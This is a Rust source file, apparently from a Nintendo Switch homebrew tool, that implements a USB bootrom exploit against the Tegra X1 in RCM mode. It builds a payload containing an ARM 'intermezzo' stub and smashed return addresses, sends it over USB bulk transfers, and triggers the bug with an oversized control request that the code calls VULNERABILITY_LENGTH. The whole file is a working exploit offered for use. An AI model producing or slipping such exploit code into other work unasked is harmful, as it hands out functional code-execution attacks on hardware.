use color_eyre::eyre::{Context, ContextCompat, bail};
use log::info;
use nusb::{
    MaybeFuture, list_devices,
    transfer::{Bulk, ControlIn, ControlType, In, Out, Recipient, TransferError},
};
use std::io::Write;
use std::{fs::File, io::Read, num::TryFromIntError, path::Path, time::Duration};

use crate::paths::RCM_PAYLOAD_EXTENSIONS;

const INTERMEZZO: [u8; 92] = [
    0x44, 0x00, 0x9f, 0xe5, 0x01, 0x11, 0xa0, 0xe3, 0x40, 0x20, 0x9f, 0xe5, 0x00, 0x20, 0x42, 0xe0,
    0x08, 0x00, 0x00, 0xeb, 0x01, 0x01, 0xa0, 0xe3, 0x10, 0xff, 0x2f, 0xe1, 0x00, 0x00, 0xa0, 0xe1,
    0x2c, 0x00, 0x9f, 0xe5, 0x2c, 0x10, 0x9f, 0xe5, 0x02, 0x28, 0xa0, 0xe3, 0x01, 0x00, 0x00, 0xeb,
    0x20, 0x00, 0x9f, 0xe5, 0x10, 0xff, 0x2f, 0xe1, 0x04, 0x30, 0x90, 0xe4, 0x04, 0x30, 0x81, 0xe4,
    0x04, 0x20, 0x52, 0xe2, 0xfb, 0xff, 0xff, 0x1a, 0x1e, 0xff, 0x2f, 0xe1, 0x20, 0xf0, 0x01, 0x40,
    0x5c, 0xf0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40,
];
const RCM_PAYLOAD_ADDRESS: u32 = 0x4001_0000;
const INTERMEZZO_LOCATION: u32 = 0x4001_F000;
// const PAYLOAD_LOAD_BLOCK: u32 = 0x40020000;
const INTERMEZZO_ADDRESS_START: usize = 0x2a8;
const PACKET_SIZE: u32 = 0x1000;
const RCM_LENGTH: u32 = 0x30298;
const INTERMEZZO_ADDRESS_REPEAT_COUNT: u32 = (INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDRESS) / 4;

fn create_rcm_payload(payload: &[u8]) -> Result<Vec<u8>, TryFromIntError> {
    let rcm_payload_size = (INTERMEZZO_ADDRESS_START as u32
        + 4 * INTERMEZZO_ADDRESS_REPEAT_COUNT
        + PACKET_SIZE
        + u32::try_from(payload.len())?)
    .div_ceil(PACKET_SIZE)
        * PACKET_SIZE;

    let mut rcm_payload = vec![0u8; rcm_payload_size as usize];

    rcm_payload[..4].copy_from_slice(&RCM_LENGTH.to_le_bytes());

    // TODO: replace with chunks_exact or something
    // maybe even avoid mut rcm_paylad by creating from iterator
    for i in 0..INTERMEZZO_ADDRESS_REPEAT_COUNT as usize {
        rcm_payload[INTERMEZZO_ADDRESS_START + i * 4..INTERMEZZO_ADDRESS_START + (i + 1) * 4]
            .copy_from_slice(&INTERMEZZO_LOCATION.to_le_bytes());
    }

    rcm_payload[INTERMEZZO_ADDRESS_START + 0x4 * INTERMEZZO_ADDRESS_REPEAT_COUNT as usize
        ..INTERMEZZO_ADDRESS_START
            + 4 * INTERMEZZO_ADDRESS_REPEAT_COUNT as usize
            + INTERMEZZO.len()]
        .copy_from_slice(&INTERMEZZO);

    rcm_payload[INTERMEZZO_ADDRESS_START
        + 4 * INTERMEZZO_ADDRESS_REPEAT_COUNT as usize
        + PACKET_SIZE as usize
        ..INTERMEZZO_ADDRESS_START
            + 4 * INTERMEZZO_ADDRESS_REPEAT_COUNT as usize
            + PACKET_SIZE as usize
            + payload.len()]
        .copy_from_slice(payload);

    Ok(rcm_payload)
}

pub fn send_rcm_payload(payload_path: &Path) -> color_eyre::Result<()> {
    if payload_path.extension().is_none_or(|ext| {
        !ext.to_str()
            .is_some_and(|ext| RCM_PAYLOAD_EXTENSIONS.contains(&ext))
    }) {
        bail!(
            "RCM payload file must have a valid extension ({:?})",
            RCM_PAYLOAD_EXTENSIONS
        );
    }

    let mut payload_file = File::open(payload_path).context("Unable to open RCM payload file")?;
    let mut payload = vec![];
    let payload_length = payload_file.read_to_end(&mut payload)?;
    info!(
        "loaded payload '{}', which is {} bytes",
        payload_path.display(),
        payload_length
    );

    let rcm_payload = create_rcm_payload(&payload)?;
    info!("created rcm payload, now {} bytes", rcm_payload.len());

    let device_info = list_devices()
        .wait()?
        .find(|dev| dev.vendor_id() == 0x0955)
        .wrap_err("Unable to discover Nintendo Switch in RCM mode through USB.")?;

    info!(
        "RCM Nintendo Switch discovered at bus {} and address {}",
        device_info.bus_id(),
        device_info.device_address()
    );

    let device = device_info.open().wait()?;
    let interface = device.claim_interface(0).wait()?;

    let mut writer = interface.endpoint::<Bulk, Out>(0x01)?.writer(4096);
    let mut reader = interface.endpoint::<Bulk, In>(0x81)?.reader(4096);

    let mut device_id = [0; 16];
    reader.read_exact(&mut device_id)?;
    info!("Device ID: {:02x?}", device_id);

    let mut write_count = 0;

    for chunk in rcm_payload.chunks(PACKET_SIZE as usize) {
        writer.write_all(chunk)?;
        writer.flush()?;
        write_count += 1;
    }

    const PADDING: &[u8] = &[0u8; PACKET_SIZE as usize];
    if write_count % 2 != 1 {
        writer.write_all(PADDING)?;
        writer.flush()?;
        write_count += 1;
    }

    info!("Total USB bulk writes: {}", write_count);

    const VULNERABILITY_LENGTH: u16 = 0x7000;
    match interface
        .control_in(
            ControlIn {
                control_type: ControlType::Standard,
                recipient: Recipient::Interface,
                request: 0x00,
                value: 0x00,
                index: 0x00,
                length: VULNERABILITY_LENGTH,
            },
            Duration::from_secs(1),
        )
        .wait()
    {
        Err(TransferError::Cancelled) => {
            println!("Successfully injected payload!");
            Ok(())
        }
        Err(e) => bail!("Unexpected error {e} while triggering vulnerability"),
        Ok(_) => bail!(
            "Unexpectedly read data from the device, vulnerability may not have been triggered"
        ),
    }
}
